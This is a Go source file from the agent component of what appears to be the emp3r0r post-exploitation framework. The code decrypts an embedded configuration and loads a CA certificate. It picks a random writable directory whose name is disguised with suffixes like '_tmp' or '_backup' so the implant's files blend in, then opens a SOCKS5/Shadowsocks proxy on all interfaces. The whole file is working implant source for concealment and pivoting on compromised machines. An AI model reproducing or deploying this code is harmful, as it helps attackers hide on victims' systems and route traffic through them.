package agent

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/txthinking/socks5"
)

var RuntimeConfig = &emp3r0r_data.Config{}

func ApplyRuntimeConfig() (err error) {
	readJsonData, err := util.ExtractData()
	if err != nil {
		return fmt.Errorf("read config: %v", err)
	}

	// decrypt attached JSON file
	jsonData, err := tun.AES_GCM_Decrypt(emp3r0r_data.OneTimeMagicBytes, readJsonData)
	if err != nil {
		err = fmt.Errorf("Decrypt config JSON failed (%v), invalid config data?", err)
		return
	}

	// parse JSON
	err = emp3r0r_data.ReadJSONConfig(jsonData, RuntimeConfig)
	if err != nil {
		short_view := jsonData
		if len(jsonData) > 100 {
			short_view = jsonData[:100]
		}
		return fmt.Errorf("parsing %d bytes of JSON data (%s...): %v", len(jsonData), short_view, err)
	}

	// CA
	tun.CACrt = []byte(RuntimeConfig.CAPEM)

	// pwd
	cwd, err := os.Getwd()
	if err != nil {
		return fmt.Errorf("os.Getwd: %v", err)
	}

	agent_root_base := util.FileBaseName(RuntimeConfig.AgentRoot)
	prefix, err := GetRandomWritablePath()
	if err != nil {
		log.Printf("GetRandomWritablePath: %v, falling back to current directory", err)
		prefix = cwd
	}
	RuntimeConfig.AgentRoot = fmt.Sprintf("%s/%s", prefix, agent_root_base)
	RuntimeConfig.UtilsPath = fmt.Sprintf("%s/%s", prefix, RuntimeConfig.UtilsPath)
	RuntimeConfig.SocketName = fmt.Sprintf("%s/%s", prefix, RuntimeConfig.SocketName)
	RuntimeConfig.PIDFile = fmt.Sprintf("%s/%s", prefix, RuntimeConfig.PIDFile)
	log.Printf("Agent root: %s", RuntimeConfig.AgentRoot)

	// Socks5 proxy server
	addr := fmt.Sprintf("0.0.0.0:%s", RuntimeConfig.AutoProxyPort)
	emp3r0r_data.ProxyServer, err = socks5.NewClassicServer(addr, "",
		RuntimeConfig.ShadowsocksPort, RuntimeConfig.Password,
		RuntimeConfig.AutoProxyTimeout, RuntimeConfig.AutoProxyTimeout)
	return
}

// GetRandomWritablePath get a random writable path for privileged or normal user
func GetRandomWritablePath() (string, error) {
	var paths []string
	root_path := os.TempDir()
	if HasRoot() {
		root_path = "/var"
	}

	// Helper function to append writable paths
	appendWritablePaths := func(basePath string) {
		writablePaths, err := util.GetWritablePaths(basePath, 4)
		if err == nil {
			paths = append(paths, writablePaths...)
		}
	}

	appendWritablePaths(root_path)

	homeDir, err := os.UserHomeDir()
	if err == nil {
		appendWritablePaths(homeDir)
	}

	// if emp3r0r's agent root already exists?
	for _, path := range paths {
		if util.FileBaseName(path) == RuntimeConfig.AgentRoot {
			// just use it
			return filepath.Dir(path), nil // return parent dir of path
		}
	}

	just_get_one := func() string {
		rand_common_path := emp3r0r_data.CommonDirs[util.RandInt(0, len(emp3r0r_data.CommonDirs))]
		suffixes := []string{"_tmp", "_temp", "_backup", "_copy"}
		rand_suffix := suffixes[util.RandInt(0, len(suffixes))]
		if util.IsExist(rand_common_path) {
			rand_common_path += rand_suffix
		}
		return rand_common_path
	}

	if len(paths) == 0 {
		return just_get_one(), nil
	}

	// Filter paths to ensure they are level 3 or above
	var level3Paths []string
	var rand_path string
	for _, path := range paths {
		if strings.Count(path, "/") >= 3 {
			level3Paths = append(level3Paths, path)
		}
	}
	if len(level3Paths) == 0 {
		rand_path = just_get_one()
		return rand_path, nil
	}
	rand_path = level3Paths[util.RandInt(0, len(level3Paths))]

	if !strings.HasSuffix(rand_path, "/") {
		rand_path += "/"
	}
	return rand_path, nil
}
